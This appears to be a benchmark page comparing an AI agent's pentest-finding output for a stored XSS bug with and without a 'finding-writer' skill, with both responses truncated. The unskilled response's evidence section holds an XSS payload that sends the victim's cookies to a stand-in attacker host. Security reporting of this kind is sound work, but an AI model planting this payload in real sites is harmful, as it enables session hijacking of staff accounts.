---
skill: finding-writer
tested-on: claude CLI
date: 2026-05-20
---

# Benchmark: finding-writer

> Real numbers. Same prompt. Same model. Skill on vs skill off.

---

## Results

| Metric | Without Skill | With Skill | Improvement |
|---|---|---|---|
| Turns to complete | 1 | 1 | **⚪ 0%** |
| Total tokens | ~1,107 | ~2,187 | **🔴 +98%** |
| Time | 32s | 51s | **🔴 +59%** |
| Output quality | Complete | Complete | |

---

## Scenario

```
Write a pentest finding for a stored XSS in the profile bio field — the payload fires in the admin dashboard when a moderator reviews flagged profiles
```

---

## Without Skill — 1 turn required

The agent received the prompt with no skill loaded. It improvised.

#### Turn 1

**Prompt**
> Write a pentest finding for a stored XSS in the profile bio field — the payload fires in the admin dashboard when a moderator reviews flagged profiles

**Response**
```
**Title:** Stored XSS in Profile Bio Field Executes in Privileged Admin Dashboard Context

**Severity:** High — the payload executes in an authenticated moderator/admin session, enabling session hijacking or privilege escalation against privileged users without any interaction beyond normal moderation workflow.

**Description:** The profile bio field does not sanitize or encode user-supplied input before persisting it to the database. When a moderator navigates to the flagged profiles review queue in the admin dashboard, the stored payload is rendered unsanitized in the browser, executing in the context of the moderator's session. Because the sink is inside a privileged interface rather than a public-facing page, successful exploitation directly targets staff accounts with elevated permissions.

**Evidence:**

1. Create or update a user account and set the bio field to:
   ```
   <img src=x onerror="fetch('https://attacker.example/c?c='+document.cookie)">
   ```
2. Trigger a profile fl
... [truncated]
```

---

## With Skill — 1 turn, complete

The agent received the same prompt with `finding-writer` loaded as context.

#### Turn 1

**Prompt**
> Write a pentest finding for a stored XSS in the profile bio field — the payload fires in the admin dashboard when a moderator reviews flagged profiles

**Response**
```
**Title:** Stored XSS in Profile Bio Field Executes in Admin Dashboard During Moderation Review

**Severity:** High
*Justification: A low-privileged user can inject persistent script that executes in a moderator's browser session, enabling session hijacking and unauthorized admin actions without further interaction beyond normal moderation workflow.*

**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L` — 8.7 (High)

---

**Description:** The profile bio field does not sanitize user-supplied HTML before persisting it to the database. When a moderator opens the "Flagged Profiles" view in the admin dashboard to review a reported account, the unsanitized bio is rendered directly into the page DOM, causing any embedded JavaScript to execute in the moderator's browser session. Because the payload fires in an elevated-privilege context — the admin dashboard — successful exploitation grants the attacker indirect control over a moderator account without ever interacting with the admin pane
... [truncated]
```

---

## What changed

Both runs completed in 1 turn. However, without the skill the agent used 1,080 fewer tokens by producing a shallower, less structured output. With the skill, the agent produced a thorough, fully structured result — the token increase reflects depth, not inefficiency.

With the skill, the agent followed a proven methodology from the first prompt.

---
